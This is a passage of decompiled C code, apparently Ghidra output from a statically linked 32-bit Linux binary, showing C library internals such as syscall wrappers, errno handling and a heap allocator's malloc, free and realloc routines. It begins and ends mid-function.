    if (param_2 == 0xe) {
      iVar1 = thunk_FUN_08052b2b(0xdd,param_1,0xe,param_3,0,0,0,&stack0x00000010);
      goto LAB_08052a51;
    }
    if (param_2 == 9) {
      iVar1 = FUN_08052ae0();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08052ae0();
        return iVar1;
      }
      if (iVar1 == 0) {
        if (iStack_1c != 2) {
          return iStack_18;
        }
        return -iStack_18;
      }
      goto LAB_08052a51;
    }
    if (param_2 == 0x406) {
      iVar1 = FUN_08052ae0();
      if (iVar1 == -0x16) {
        iVar1 = FUN_08052ae0();
        if (iVar1 == -0x16) {
          iVar1 = FUN_08052ae0();
          if (-1 < iVar1) {
            FUN_08052ae0();
          }
        }
        else {
          if (-1 < iVar1) {
            FUN_08052ae0();
          }
          iVar1 = -0x16;
        }
      }
      else if (-1 < iVar1) {
        FUN_08052ae0();
      }
      goto LAB_08052a51;
    }
  }
  iVar1 = FUN_08052ae0();
LAB_08052a51:
  iVar1 = FUN_08052b50(iVar1);
  return iVar1;
}



void FUN_08052a68(undefined4 param_1,uint param_2,undefined4 param_3)

{
  undefined *puVar1;
  int iVar2;
  undefined4 uVar3;
  int extraout_EDX;
  
  if ((param_2 & 0x40) == 0) {
    puVar1 = (undefined *)(param_2 & 0x410000);
    uVar3 = 0;
    if (puVar1 != (undefined *)0x410000) goto LAB_08052a94;
  }
  puVar1 = &stack0x00000010;
  uVar3 = param_3;
LAB_08052a94:
  iVar2 = thunk_FUN_08052b2b(5,param_1,param_2 | 0x8000,uVar3,0,0,0,puVar1);
  if ((-1 < iVar2) && ((param_2 & 0x80000) != 0)) {
    FUN_08052ae0();
    iVar2 = extraout_EDX;
  }
  FUN_08052b50(iVar2);
  return;
}



void __regparm3 FUN_08052ae0(undefined4 param_1)

{
  FUN_08052af6(param_1);
  return;
}



undefined4 FUN_08052af6(undefined4 param_1)

{
  code *pcVar1;
  undefined4 uVar2;
  int unaff_retaddr;
  
  if (*(int *)(unaff_retaddr + 0x4e04) != 0) {
    return param_1;
  }
  pcVar1 = (code *)swi(0x80);
  uVar2 = (*pcVar1)();
  return uVar2;
}



void __regparm1 FUN_08052b11(undefined4 param_1,undefined4 *param_2)

{
  FUN_08052ae0(*param_2,param_1);
  return;
}



void FUN_08052b2b(void)

{
  FUN_08052b11(&stack0x00000018);
  return;
}



uint FUN_08052b50(uint param_1)

{
  int *piVar1;
  
  if (0xfffff000 < param_1) {
    piVar1 = (int *)FUN_080528b0();
    *piVar1 = -param_1;
    param_1 = 0xffffffff;
  }
  return param_1;
}



void FUN_08052b78(void)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 auStack_20 [5];
  undefined *puStack_c;
  
  iVar3 = 1;
  puVar2 = (undefined4 *)&stack0x00000008;
  do {
    auStack_20[iVar3] = *puVar2;
    iVar3 = iVar3 + 1;
    puVar2 = puVar2 + 1;
  } while (iVar3 != 5);
  puStack_c = &stack0x00000018;
  uVar1 = FUN_08052ae0(auStack_20[4]);
  FUN_08052b50(uVar1);
  return;
}



undefined4 FUN_08052be0(uint param_1,uint param_2)

{
  undefined4 uVar1;
  undefined4 *puVar2;
  
  if ((param_2 != 0) && ((uint)(0xffffffff / (ulonglong)param_2) < param_1)) {
    puVar2 = (undefined4 *)FUN_080528b0();
    *puVar2 = 0xc;
    return 0;
  }
  uVar1 = FUN_08053d30();
  return uVar1;
}



undefined4 __regparm3 FUN_08052c20(uint *param_1)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  uint uVar4;
  bool bVar5;
  undefined *in_stack_ffffffc4;
  uint uStack_24;
  
  uVar4 = *param_1;
  do {
    while( true ) {
      do {
        if ((uVar4 & 1) != 0) {
          return 0;
        }
        uVar1 = (uVar4 >> 4) - 1;
        uStack_24 = uVar1;
        if ((0x20 < uVar1) && (uStack_24 = 0x3f, uVar1 < 0x1c01)) {
          uStack_24 = ((uint)(float)uVar1 >> 0x15) - 0x1f0;
        }
        iVar2 = uStack_24 * 0x10;
        uVar1 = uVar4;
        if (DAT_080578cc != 0) {
          LOCK();
          iVar3 = *(int *)(&DAT_08057188 + iVar2);
          *(int *)(&DAT_08057188 + iVar2) = 1;
          UNLOCK();
          if (iVar3 == 0) {
            uVar1 = *param_1;
          }
          else {
            do {
              in_stack_ffffffc4 = &DAT_08057188 + iVar2;
              FUN_08054a70(&DAT_08057188 + iVar2,&DAT_0805718c + iVar2,1,1);
              LOCK();
              iVar3 = *(int *)(&DAT_08057188 + iVar2);
              *(int *)(&DAT_08057188 + iVar2) = 1;
              UNLOCK();
            } while (iVar3 != 0);
            uVar1 = *param_1;
          }
        }
        iVar2 = uStack_24 * 0x10;
        if (*(int *)(&DAT_08057190 + iVar2) == 0) {
          *(undefined **)(&DAT_08057194 + iVar2) = &DAT_08057188 + iVar2;
          *(undefined **)(&DAT_08057190 + iVar2) = &DAT_08057188 + iVar2;
        }
        if (uVar1 == uVar4) {
          uVar4 = uVar4 & 0xfffffffe;
          iVar3 = *(int *)((int)param_1 + (0xc - uVar4));
          if (iVar3 == *(int *)((int)param_1 + (8 - uVar4))) {
            bVar5 = (uStack_24 & 0x20) == 0;
            LOCK();
            DAT_08057180 = DAT_08057180 & ~((uint)bVar5 << ((byte)uStack_24 & 0x1f));
            UNLOCK();
            LOCK();
            DAT_08057184 = DAT_08057184 & ~((uint)!bVar5 << ((byte)uStack_24 & 0x1f));
            UNLOCK();
            iVar3 = *(int *)((int)param_1 + (0xc - uVar4));
          }
          *(undefined4 *)(iVar3 + 8) = *(undefined4 *)((int)param_1 + (8 - uVar4));
          *(int *)(*(int *)((int)param_1 + (8 - uVar4)) + 0xc) = iVar3;
          uVar1 = *(uint *)((int)param_1 + (4 - uVar4));
          *(uint *)((int)param_1 + (4 - uVar4)) = uVar1 | 1;
          param_1 = (uint *)((int)param_1 + ((uVar1 & 0xfffffffe) - uVar4));
          *param_1 = *param_1 | 1;
          if (*(int *)(&DAT_08057188 + iVar2) != 0) {
            *(undefined4 *)(&DAT_08057188 + iVar2) = 0;
            LOCK();
            UNLOCK();
            if ((*(int *)(&DAT_0805718c + iVar2) != 0) &&
               (iVar2 = FUN_08052ae0(in_stack_ffffffc4), iVar2 == -0x26)) {
              FUN_08052ae0(in_stack_ffffffc4);
              return 1;
            }
          }
          return 1;
        }
        uVar4 = uVar1;
      } while (*(int *)(&DAT_08057188 + iVar2) == 0);
      *(undefined4 *)(&DAT_08057188 + iVar2) = 0;
      LOCK();
      UNLOCK();
      if (*(int *)(&DAT_0805718c + iVar2) != 0) break;
LAB_08052d71:
      uVar4 = *param_1;
    }
    iVar2 = FUN_08052ae0(in_stack_ffffffc4);
    if (iVar2 == -0x26) {
      FUN_08052ae0(in_stack_ffffffc4);
      goto LAB_08052d71;
    }
    uVar4 = *param_1;
  } while( true );
}



undefined4 __regparm3 FUN_08052e80(int param_1)

{
  uint *puVar1;
  uint uVar2;
  undefined4 uVar3;
  uint uVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  bool bVar8;
  undefined *in_stack_ffffffc4;
  uint uStack_28;
  
  uVar2 = *(uint *)(param_1 + 4);
  uVar7 = *(uint *)(param_1 + 4);
  while( true ) {
    if ((uVar2 & 1) != 0) {
      return 0;
    }
    uVar4 = (uVar2 >> 4) - 1;
    uStack_28 = uVar4;
    if ((0x20 < uVar4) && (uStack_28 = 0x3f, uVar4 < 0x1c01)) {
      uStack_28 = ((uint)(float)uVar4 >> 0x15) - 0x1f0;
    }
    iVar5 = uStack_28 * 0x10;
    uVar4 = uVar2;
    if (DAT_080578cc != 0) {
      LOCK();
      iVar6 = *(int *)(&DAT_08057188 + iVar5);
      *(int *)(&DAT_08057188 + iVar5) = 1;
      UNLOCK();
      if (iVar6 != 0) {
        do {
          in_stack_ffffffc4 = &DAT_08057188 + iVar5;
          FUN_08054a70(&DAT_08057188 + iVar5,&DAT_0805718c + iVar5,1,1);
          LOCK();
          iVar6 = *(int *)(&DAT_08057188 + iVar5);
          *(int *)(&DAT_08057188 + iVar5) = 1;
          UNLOCK();
        } while (iVar6 != 0);
      }
      uVar4 = *(uint *)(param_1 + 4);
      uVar7 = uVar4;
    }
    iVar5 = uStack_28 * 0x10;
    if (*(int *)(&DAT_08057190 + iVar5) == 0) {
      *(undefined **)(&DAT_08057194 + iVar5) = &DAT_08057188 + iVar5;
      *(undefined **)(&DAT_08057190 + iVar5) = &DAT_08057188 + iVar5;
    }
    if (uVar4 == uVar2) break;
    uVar2 = uVar4;
    if (*(int *)(&DAT_08057188 + iVar5) != 0) {
      *(undefined4 *)(&DAT_08057188 + iVar5) = 0;
      LOCK();
      UNLOCK();
      if ((*(int *)(&DAT_0805718c + iVar5) != 0) &&
         (iVar5 = FUN_08052ae0(in_stack_ffffffc4), iVar5 == -0x26)) {
        FUN_08052ae0(in_stack_ffffffc4);
      }
      uVar2 = *(uint *)(param_1 + 4);
      uVar7 = uVar2;
    }
  }
  iVar6 = *(int *)(param_1 + 0xc);
  if (iVar6 == *(int *)(param_1 + 8)) {
    bVar8 = (uStack_28 & 0x20) == 0;
    LOCK();
    DAT_08057180 = DAT_08057180 & ~((uint)bVar8 << ((byte)uStack_28 & 0x1f));
    UNLOCK();
    LOCK();
    DAT_08057184 = DAT_08057184 & ~((uint)!bVar8 << ((byte)uStack_28 & 0x1f));
    UNLOCK();
    uVar7 = *(uint *)(param_1 + 4);
    iVar6 = *(int *)(param_1 + 0xc);
  }
  uVar3 = *(undefined4 *)(param_1 + 8);
  *(uint *)(param_1 + 4) = uVar7 | 1;
  puVar1 = (uint *)((uVar7 & 0xfffffffe) + param_1);
  *puVar1 = *puVar1 | 1;
  *(undefined4 *)(iVar6 + 8) = uVar3;
  *(int *)(*(int *)(param_1 + 8) + 0xc) = iVar6;
  if (*(int *)(&DAT_08057188 + iVar5) != 0) {
    *(undefined4 *)(&DAT_08057188 + iVar5) = 0;
    LOCK();
    UNLOCK();
    if ((*(int *)(&DAT_0805718c + iVar5) != 0) &&
       (iVar5 = FUN_08052ae0(in_stack_ffffffc4), iVar5 == -0x26)) {
      FUN_08052ae0(in_stack_ffffffc4);
      return 1;
    }
  }
  return 1;
}



void FUN_080530c0(int param_1)

{
  int iVar1;
  bool bVar2;
  uint uVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  uint *puVar7;
  bool bVar8;
  undefined4 *in_stack_ffffffb4;
  uint *puStack_34;
  uint uStack_30;
  uint uStack_24;
  
  if (param_1 != 0) {
    puVar7 = (uint *)(param_1 + -8);
    uVar3 = *(uint *)(param_1 + -4);
    if ((uVar3 & 1) != 0) {
      uVar5 = uVar3 & 0xfffffffe;
      puStack_34 = (uint *)(uVar5 + (int)puVar7);
      if (uVar3 != *puStack_34) {
        do {
                    // WARNING: Do nothing block with infinite loop
        } while( true );
      }
      bVar2 = false;
      uStack_30 = uVar5;
      do {
        if ((*puVar7 & puStack_34[1] & 1) != 0) {
          puVar7[1] = uStack_30 | 1;
          *puStack_34 = uStack_30 | 1;
          uVar3 = (uStack_30 >> 4) - 1;
          uStack_24 = uVar3;
          if ((0x20 < uVar3) && (uStack_24 = 0x3f, uVar3 < 0x1c01)) {
            uStack_24 = ((uint)(float)uVar3 >> 0x15) - 0x1f0;
          }
          iVar6 = uStack_24 * 0x10;
          if (DAT_080578cc != 0) {
            LOCK();
            iVar1 = *(int *)(&DAT_08057188 + iVar6);
            *(int *)(&DAT_08057188 + iVar6) = 1;
            UNLOCK();
            if (iVar1 != 0) {
              do {
                in_stack_ffffffb4 = (undefined4 *)(&DAT_08057188 + iVar6);
                FUN_08054a70(&DAT_08057188 + iVar6,&DAT_0805718c + iVar6,1,1);
                LOCK();
                iVar1 = *(int *)(&DAT_08057188 + iVar6);
                *(int *)(&DAT_08057188 + iVar6) = 1;
                UNLOCK();
              } while (iVar1 != 0);
            }
          }
          iVar6 = uStack_24 * 0x10;
          if (*(int *)(&DAT_08057190 + iVar6) == 0) {
            *(undefined **)(&DAT_08057194 + iVar6) = &DAT_08057188 + iVar6;
            *(undefined **)(&DAT_08057190 + iVar6) = &DAT_08057188 + iVar6;
          }
          if (DAT_080578cc == 0) {
            uVar4 = *puVar7 & puStack_34[1];
            uVar3 = DAT_08057588;
          }
          else {
            while( true ) {
              uVar3 = DAT_08057588;
              LOCK();
              DAT_08057588 = 1;
              UNLOCK();
              if (uVar3 == 0) break;
              in_stack_ffffffb4 = &DAT_08057588;
              FUN_08054a70(&DAT_08057588,&DAT_0805758c,1,1);
            }
            uVar4 = *puVar7 & puStack_34[1];
            uVar3 = DAT_08057588;
          }
          DAT_08057588 = uVar4 & 1;
          if (DAT_08057588 != 0) {
            uVar5 = DAT_08057180 >> ((byte)uStack_24 & 0x1f) |
                    DAT_08057184 << 0x20 - ((byte)uStack_24 & 0x1f);
            if ((uStack_24 & 0x20) != 0) {
              uVar5 = DAT_08057184 >> ((byte)uStack_24 & 0x1f);
            }
            if ((uVar5 & 1) == 0) {
              bVar8 = (uStack_24 & 0x20) == 0;
              LOCK();
              DAT_08057180 = DAT_08057180 | (uint)bVar8 << ((byte)uStack_24 & 0x1f);
              UNLOCK();
              LOCK();
              DAT_08057184 = DAT_08057184 | (uint)!bVar8 << ((byte)uStack_24 & 0x1f);
              UNLOCK();
            }
            DAT_08057588 = uVar3;
            puVar7[1] = uStack_30;
            *puStack_34 = uStack_30;
            if (DAT_08057588 != 0) {
              DAT_08057588 = 0;
              LOCK();
              UNLOCK();
              if ((DAT_0805758c != 0) && (iVar6 = FUN_08052ae0(in_stack_ffffffb4), iVar6 == -0x26))
              {
                FUN_08052ae0(in_stack_ffffffb4);
              }
            }
            iVar6 = uStack_24 * 0x10;
            puVar7[2] = (uint)(&DAT_08057188 + iVar6);
            puVar7[3] = *(uint *)(&DAT_08057194 + iVar6);
            *(uint **)(&DAT_08057194 + iVar6) = puVar7;
            *(uint **)(puVar7[3] + 8) = puVar7;
            if (bVar2) {
              in_stack_ffffffb4 = (undefined4 *)((int)puVar7 + 0x100fU & 0xfffff000);
              FUN_08053da4(in_stack_ffffffb4,
                           ((uint)(puStack_34 + -4) & 0xfffff000) - (int)in_stack_ffffffb4,4);
            }
            if (*(int *)(&DAT_08057188 + iVar6) == 0) {
              return;
            }
            *(undefined4 *)(&DAT_08057188 + iVar6) = 0;
            LOCK();
            UNLOCK();
            if (*(int *)(&DAT_0805718c + iVar6) == 0) {
              return;
            }
            iVar6 = FUN_08052ae0(in_stack_ffffffb4);
            if (iVar6 != -0x26) {
              return;
            }
            FUN_08052ae0(in_stack_ffffffb4);
            return;
          }
          if (uVar3 != 0) {
            LOCK();
            UNLOCK();
            uVar3 = DAT_08057588;
            if ((DAT_0805758c != 0) &&
               (iVar6 = FUN_08052ae0(in_stack_ffffffb4), uVar3 = DAT_08057588, iVar6 == -0x26)) {
              FUN_08052ae0();
              uVar3 = DAT_08057588;
            }
          }
          DAT_08057588 = uVar3;
          iVar6 = uStack_24 * 0x10;
          if (*(int *)(&DAT_08057188 + iVar6) != 0) {
            *(undefined4 *)(&DAT_08057188 + iVar6) = 0;
            LOCK();
            UNLOCK();
            if ((*(int *)(&DAT_0805718c + iVar6) != 0) &&
               (iVar6 = FUN_08052ae0(in_stack_ffffffb4), iVar6 == -0x26)) {
              FUN_08052ae0();
            }
          }
        }
        iVar6 = FUN_08052c20();
        if (iVar6 != 0) {
          puVar7 = (uint *)((int)puVar7 - (*puVar7 & 0xfffffffe));
          uVar3 = puVar7[1] & 0xfffffffe;
          uStack_30 = uStack_30 + uVar3;
          if ((0x28000 < uVar3 + uVar5) && (uVar3 < (uVar3 + uVar5 ^ uVar3))) {
            bVar2 = true;
          }
        }
        iVar6 = FUN_08052e80();
        if (iVar6 != 0) {
          uVar3 = puStack_34[1] & 0xfffffffe;
          if ((0x28000 < uVar3 + uVar5) && (uVar3 < (uVar3 + uVar5 ^ uVar3))) {
            bVar2 = true;
          }
          uStack_30 = uStack_30 + uVar3;
          puStack_34 = (uint *)((int)puStack_34 + uVar3);
        }
      } while( true );
    }
    uVar5 = *(uint *)(param_1 + -8);
    if ((uVar5 & 1) != 0) {
      do {
                    // WARNING: Do nothing block with infinite loop
      } while( true );
    }
    FUN_08053ead((int)puVar7 - uVar5,(uVar3 & 0xfffffffe) + uVar5);
  }
  return;
}



uint * FUN_08053520(int param_1)

{
  uint *puVar1;
  uint uVar2;
  uint uVar3;
  undefined4 *puVar4;
  int iVar5;
  int iVar6;
  uint uVar7;
  uint uVar8;
  uint uVar9;
  bool bVar10;
  undefined *in_stack_ffffff94;
  uint *puVar11;
  uint *puStack_40;
  uint uStack_3c;
  uint uStack_38;
  uint uStack_28;
  uint uStack_1c;
  float fStack_18;
  
  if (param_1 - 1U < 0x7fffeff0) {
    uStack_28 = param_1 + 0x17U & 0xfffffff0;
    if (0x1c000 < uStack_28) {
      uVar8 = uStack_28 + 0x1007 & 0xfffff000;
      iVar6 = FUN_08053dc9(0,uVar8,3,0x22,0xffffffff,0,0);
      if (iVar6 == -1) {
        return (uint *)0x0;
      }
      *(uint *)(iVar6 + 0xc) = uVar8 - 8;
      *(undefined4 *)(iVar6 + 8) = 8;
      return (uint *)(iVar6 + 0x10);
    }
    uStack_3c = (param_1 + 0x17U >> 4) - 1;
    if (0x20 < uStack_3c) {
      fStack_18 = (float)uStack_3c;
      uStack_3c = ((int)fStack_18 + 0x1fffffU >> 0x15) - 0x1f0;
    }
  }
  else {
    uStack_28 = 0x10;
    uStack_3c = 0;
    if (param_1 != 0) {
      puVar4 = (undefined4 *)FUN_080528b0();
      *puVar4 = 0xc;
      return (uint *)0x0;
    }
  }
  uVar2 = -1 << ((byte)uStack_3c & 0x1f);
  uVar8 = 0xffffffff;
  uVar3 = uVar2;
  if ((uStack_3c & 0x20) != 0) {
    uVar3 = 0;
    uVar8 = uVar2;
  }
  do {
    uVar7 = uVar8 & DAT_08057184;
    uVar2 = uVar3 & DAT_08057180;
    if ((uVar7 | uVar2) == 0) {
      uStack_1c = uStack_28 + 0x10;
      if (DAT_080578cc != 0) {
        while( true ) {
          iVar6 = DAT_08057164;
          LOCK();
          DAT_08057164 = 1;
          UNLOCK();
          if (iVar6 == 0) break;
          FUN_08054a70(&DAT_08057164,&DAT_08057168,1,1);
        }
      }
      puVar11 = &uStack_1c;
      iVar6 = FUN_08055ac0(puVar11);
      if (iVar6 == 0) {
        if (DAT_08057164 != 0) {
          LOCK();
          UNLOCK();
          DAT_08057164 = iVar6;
          if ((DAT_08057168 != 0) && (iVar6 = FUN_08052ae0(puVar11), iVar6 == -0x26)) {
            FUN_08052ae0(puVar11);
            return (uint *)0x0;
          }
        }
        return (uint *)0x0;
      }
      iVar5 = iVar6;
      if (iVar6 != DAT_08057160) {
        iVar5 = iVar6 + 0x10;
        uStack_1c = uStack_1c - 0x10;
        *(undefined4 *)(iVar6 + 8) = 1;
      }
      puVar1 = (uint *)(iVar5 + -8);
      DAT_08057160 = iVar5 + uStack_1c;
      *(undefined4 *)(DAT_08057160 + -4) = 1;
      *(uint *)(DAT_08057160 + -8) = uStack_1c | 1;
      *(uint *)(iVar5 + -4) = uStack_1c | 1;
      if (DAT_08057164 != 0) {
        DAT_08057164 = 0;
        LOCK();
        UNLOCK();
        if ((DAT_08057168 != 0) && (iVar6 = FUN_08052ae0(puVar11), iVar6 == -0x26)) {
          FUN_08052ae0();
        }
      }
      iVar6 = FUN_08052c20();
      puStack_40 = puVar1;
      if (iVar6 != 0) {
        uVar8 = *(uint *)(iVar5 + -4);
        puStack_40 = (uint *)((int)puVar1 - (*puVar1 & 0xfffffffe));
        uVar3 = (puStack_40[1] & 0xfffffffe) + uVar8;
        puStack_40[1] = uVar3;
        *(uint *)((int)puVar1 + (uVar8 & 0xfffffffe)) = uVar3;
      }
LAB_0805375a:
      uVar8 = puStack_40[1] & 0xfffffffe;
      if (uStack_28 < uVar8 - 0x10) {
        puVar11 = (uint *)((int)puStack_40 + uStack_28);
        *puVar11 = uStack_28 | 1;
        uVar3 = uVar8 - uStack_28 | 1;
        puVar11[1] = uVar3;
        *(uint *)((int)puStack_40 + uVar8) = uVar3;
        puStack_40[1] = uStack_28 | 1;
        FUN_080530c0(puVar11 + 2);
      }
      return puStack_40 + 2;
    }
    uVar9 = 0;
    if (uVar2 != 0) {
      for (; (uVar2 >> uVar9 & 1) == 0; uVar9 = uVar9 + 1) {
      }
    }
    if (uVar2 == 0) {
      iVar6 = 0;
      if (uVar7 != 0) {
        for (; (uVar7 >> iVar6 & 1) == 0; iVar6 = iVar6 + 1) {
        }
      }
      uVar9 = iVar6 + 0x20;
    }
    iVar6 = uVar9 * 0x10;
    if (DAT_080578cc != 0) {
      LOCK();
      iVar5 = *(int *)(&DAT_08057188 + iVar6);
      *(int *)(&DAT_08057188 + iVar6) = 1;
      UNLOCK();
      if (iVar5 != 0) {
        do {
          in_stack_ffffff94 = &DAT_08057188 + iVar6;
          FUN_08054a70(&DAT_08057188 + iVar6,&DAT_0805718c + iVar6,1,1);
          LOCK();
          iVar5 = *(int *)(&DAT_08057188 + iVar6);
          *(int *)(&DAT_08057188 + iVar6) = 1;
          UNLOCK();
        } while (iVar5 != 0);
      }
    }
    iVar6 = uVar9 * 0x10;
    puStack_40 = *(uint **)(&DAT_08057190 + iVar6);
    if (puStack_40 == (uint *)0x0) {
      *(undefined **)(&DAT_08057194 + iVar6) = &DAT_08057188 + iVar6;
      *(undefined **)(&DAT_08057190 + iVar6) = &DAT_08057188 + iVar6;
    }
    else if (puStack_40 != (uint *)(&DAT_08057188 + iVar6)) {
      if ((int)uVar9 < 0x28) {
LAB_0805386e:
        uVar8 = puStack_40[3];
        if (uVar8 == puStack_40[2]) {
          bVar10 = (uVar9 & 0x20) == 0;
          LOCK();
          DAT_08057180 = DAT_08057180 & ~((uint)bVar10 << ((byte)uVar9 & 0x1f));
          UNLOCK();
          LOCK();
          DAT_08057184 = DAT_08057184 & ~((uint)!bVar10 << ((byte)uVar9 & 0x1f));
          UNLOCK();
          uVar8 = puStack_40[3];
        }
        *(uint *)(uVar8 + 8) = puStack_40[2];
        *(uint *)(puStack_40[2] + 0xc) = uVar8;
        uVar8 = puStack_40[1];
        puStack_40[1] = uVar8 | 1;
        puVar11 = (uint *)((uVar8 & 0xfffffffe) + (int)puStack_40);
        *puVar11 = *puVar11 | 1;
      }
      else {
        if ((int)uVar9 < (int)(uStack_3c + 3)) {
          if (uVar9 == 0x3f) {
            uStack_38 = puStack_40[1] & 0xfffffffe;
            uVar8 = uStack_38 - uStack_28;
            if (0x1c000 < uVar8) goto LAB_08053835;
          }
          goto LAB_0805386e;
        }
        uStack_38 = puStack_40[1] & 0xfffffffe;
        uVar8 = uStack_38 - uStack_28;
LAB_08053835:
        uVar3 = (uVar8 >> 4) - 1;
        if (uVar3 < 0x21) goto LAB_0805386e;
        uVar2 = 0x3f;
        if (uVar3 < 0x1c01) {
          uVar2 = ((uint)(float)uVar3 >> 0x15) - 0x1f0;
        }
        if (uVar2 != uVar9) goto LAB_0805386e;
        uVar3 = puStack_40[3];
        puVar11 = (uint *)((int)puStack_40 + uStack_28);
        uVar2 = puStack_40[2];
        puVar11[1] = uVar8;
        puVar11[3] = uVar3;
        puVar11[2] = uVar2;
        *(uint **)(uVar3 + 8) = puVar11;
        *(uint **)(puVar11[2] + 0xc) = puVar11;
        *puVar11 = uStack_28 | 1;
        puStack_40[1] = uStack_28 | 1;
        *(uint *)(uStack_38 + (int)puStack_40) = uVar8;
      }
      iVar6 = uVar9 * 0x10;
      if (*(int *)(&DAT_08057188 + iVar6) != 0) {
        *(undefined4 *)(&DAT_08057188 + iVar6) = 0;
        LOCK();
        UNLOCK();
        if ((*(int *)(&DAT_0805718c + iVar6) != 0) &&
           (iVar6 = FUN_08052ae0(in_stack_ffffff94), iVar6 == -0x26)) {
          FUN_08052ae0(in_stack_ffffff94);
        }
      }
      goto LAB_0805375a;
    }
    iVar6 = uVar9 * 0x10;
    if (*(int *)(&DAT_08057188 + iVar6) != 0) {
      *(undefined4 *)(&DAT_08057188 + iVar6) = 0;
      LOCK();
      UNLOCK();
      if ((*(int *)(&DAT_0805718c + iVar6) != 0) &&
         (iVar6 = FUN_08052ae0(in_stack_ffffff94), iVar6 == -0x26)) {
        FUN_08052ae0(in_stack_ffffff94);
      }
    }
  } while( true );
}



int FUN_08053ae0(int param_1,int param_2)

{
  uint *puVar1;
  undefined4 *puVar2;
  int iVar3;
  uint uVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  int iVar8;
  uint uStack_14;
  
  if (param_1 == 0) {
    iVar8 = FUN_08053520();
    return iVar8;
  }
  if (param_2 - 1U < 0x7fffeff0) {
    uStack_14 = param_2 + 0x17U & 0xfffffff0;
  }
  else {
    uStack_14 = 0x10;
    if (param_2 != 0) {
      puVar2 = (undefined4 *)FUN_080528b0();
      *puVar2 = 0xc;
      return 0;
    }
  }
  iVar8 = param_1 + -8;
  uVar5 = *(uint *)(param_1 + -4);
  uVar6 = uVar5 & 0xfffffffe;
  if ((uVar5 & 1) == 0) {
    uVar5 = *(uint *)(param_1 + -8);
    if ((uVar5 & 1) != 0) {
      do {
                    // WARNING: Do nothing block with infinite loop
      } while( true );
    }
    if ((uStack_14 + uVar5 < 0x1000) && (iVar3 = FUN_08053520(uStack_14), iVar3 != 0)) {
      FUN_080548bc(iVar3,param_1,uStack_14 - 8);
      FUN_080530c0(param_1);
      return iVar3;
    }
    uVar6 = uVar6 + uVar5;
    uVar7 = uStack_14 + uVar5 + 0xfff & 0xfffff000;
    if (uVar6 == uVar7) {
      return param_1;
    }
    iVar8 = FUN_08053e6c(iVar8 - uVar5,uVar6,uVar7,1);
    if (iVar8 == -1) {
      if (uVar7 < uVar6) {
        return param_1;
      }
      return 0;
    }
    *(uint *)(uVar5 + iVar8 + 4) = uVar7 - uVar5;
    return uVar5 + iVar8 + 8;
  }
  puVar1 = (uint *)(iVar8 + uVar6);
  if (uVar5 != *puVar1) {
    do {
                    // WARNING: Do nothing block with infinite loop
    } while( true );
  }
  if (uVar6 < uStack_14) {
    iVar3 = FUN_08052e80();
    if (iVar3 == 0) {
      *(uint *)(param_1 + -4) = uVar6 | 1;
      *puVar1 = uVar6 | 1;
    }
    else {
      uVar7 = puVar1[1];
      uVar5 = (uVar7 & 0xfffffffe) + uVar6;
      uVar4 = uVar5 | 1;
      *(uint *)(param_1 + -4) = uVar4;
      *(uint *)((int)puVar1 + (uVar7 & 0xfffffffe)) = uVar4;
      if (uStack_14 <= uVar5) goto LAB_08053bdc;
    }
    iVar3 = FUN_08053520(uStack_14 - 8);
    if (iVar3 != 0) {
      FUN_080548bc(iVar3,param_1,uVar6 - 8);
      FUN_080530c0(param_1);
    }
  }
  else {
    *(uint *)(param_1 + -4) = uVar6 | 1;
    *puVar1 = uVar6 | 1;
LAB_08053bdc:
    uVar6 = *(uint *)(param_1 + -4) & 0xfffffffe;
    iVar3 = param_1;
    if (uStack_14 < uVar6 - 0x10) {
      puVar1 = (uint *)(iVar8 + uStack_14);
      *puVar1 = uStack_14 | 1;
      uVar5 = uVar6 - uStack_14 | 1;
      puVar1[1] = uVar5;
      *(uint *)(iVar8 + uVar6) = uVar5;
      *(uint *)(param_1 + -4) = uStack_14 | 1;
      FUN_080530c0(puVar1 + 2);
    }
  }
  return iVar3;
}



void FUN_08053d30(int param_1)

{
  int *piVar1;
  uint uVar2;
  
  piVar1 = (int *)FUN_08053520(param_1);
  if (((piVar1 != (int *)0x0) && ((*(byte *)(piVar1 + -1) & 1) != 0)) &&
     (uVar2 = param_1 + 3U >> 2, uVar2 != 0)) {
    while( true ) {
      if (*piVar1 != 0) {
        *piVar1 = 0;
      }
      uVar2 = uVar2 - 1;
      if (uVar2 == 0) break;
      piVar1 = piVar1 + 1;
    }
  }
  return;
}



void FUN_08053d74(void)

{
  undefined4 uVar1;
  
  uVar1 = FUN_08052ae0();
  FUN_08052b50(uVar1);
  return;
}



void FUN_08053da4(void)

{
  FUN_08052ae0();
  FUN_08052b50();
  return;
}



void FUN_08053dc8(void)

{
  return;
}



undefined4
FUN_08053dc9(undefined4 param_1,uint param_2,undefined4 param_3,byte param_4,undefined4 param_5,
            uint param_6,uint param_7)

{
  undefined4 *puVar1;
  undefined4 uVar2;
  undefined4 uStack_18;
  uint uStack_14;
  
  if ((param_7 & 0xfffff000 | param_6 & 0xfff) == 0) {
    if (param_2 < 0x7fffffff) {
      if ((param_4 & 0x10) != 0) {
        FUN_08053dc8();
      }
      uStack_14 = param_6 >> 0xc | param_7 << 0x14;
      uStack_18 = param_5;
      uVar2 = FUN_08052b11(&uStack_18);
      uVar2 = FUN_08052b50(uVar2);
      return uVar2;
    }
    puVar1 = (undefined4 *)FUN_080528b0();
    *puVar1 = 0xc;
  }
  else {
    puVar1 = (undefined4 *)FUN_080528b0();
    *puVar1 = 0x16;
  }
  return 0xffffffff;
}



void FUN_08053e6c(void)

{
  undefined4 uVar1;
  undefined4 in_stack_00000014;
  
  uVar1 = FUN_08052ae0(in_stack_00000014);
  FUN_08052b50(uVar1);
  return;
}



void FUN_08053ead(void)

{
  FUN_08053dc8();
  FUN_08052ae0();
  FUN_08052b50();
  return;
}



void __regparm2
FUN_08053edc(undefined4 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,
            undefined4 param_5)

{
  undefined4 uVar1;
  undefined4 uStack_18;
  undefined4 uStack_14;
  undefined4 uStack_10;
  undefined4 uStack_c;
  undefined4 uStack_8;
  undefined4 uStack_4;
  
  uStack_c = 0;
  uStack_8 = 0;
  uStack_4 = 0;
  uStack_18 = param_3;
  uStack_14 = param_4;
  uStack_10 = param_5;
